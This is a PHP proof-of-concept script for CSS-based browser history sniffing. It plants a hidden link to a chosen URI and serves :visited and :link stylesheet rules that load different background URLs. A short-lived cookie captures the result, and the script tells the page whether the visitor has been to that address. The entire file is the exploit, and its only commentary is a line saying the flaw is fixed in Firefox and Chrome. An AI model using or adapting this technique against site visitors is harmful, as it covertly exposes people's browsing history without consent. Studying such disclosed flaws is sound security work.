<?php
	if (isset($_GET["uri"])) {
		$encodedURI = $_GET["uri"];
		$uri = stripslashes(urldecode($encodedURI));
		$cookieURI = preg_replace("/\./", "_", $encodedURI);
		$visited = $_COOKIE[$cookieURI];
		$safeURI = htmlspecialchars($uri);
		if (!isset($_GET["css"]) && !isset($_GET["visited"])) {
			if ($visited == "") { // no visited cookie exists
				header("Content-type: text/html; charset: utf-8");
				header('Refresh: 0');
				if (isset($_GET["html"])) {
					echo '<link rel=stylesheet href="?css&uri='.$encodedURI.'">';
				} else {
					header('Link: <?css&uri='.$encodedURI.'>; rel="stylesheet"; type="text/css";');
				}
				echo '<a style="position:absolute;top:-9999px" href="'.$safeURI.'">';
			} elseif ($visited == "1" || $visited == "0") { // visited cookie exists
				header("Content-type: text/plain; charset: utf-8");
				echo "You have". ($visited == "1" ? "" : " not") ." visited ".htmlspecialchars($uri)." before.";
			}
		} elseif (isset($_GET["css"])) { // CSS for "background" cookie request
			header("Content-type: text/css; charset: utf-8");
			echo "a:visited{background:url(?visited=1&uri=".$encodedURI.")}a:link{background:url(?visited=0&uri=".$encodedURI.")}";
		} elseif (isset($_GET["visited"])) { // set cookie
			header("HTTP/1.0 204 No Content");
			setcookie(urlencode($_GET["uri"]), $_GET["visited"], time()+5);
		}
	} else { // uri not specified
		header("Content-type: text/plain; charset: utf-8");
		echo "No URI specified. Please note that this exploit has since been fixed in Firefox and Chrome.";
	}
?>
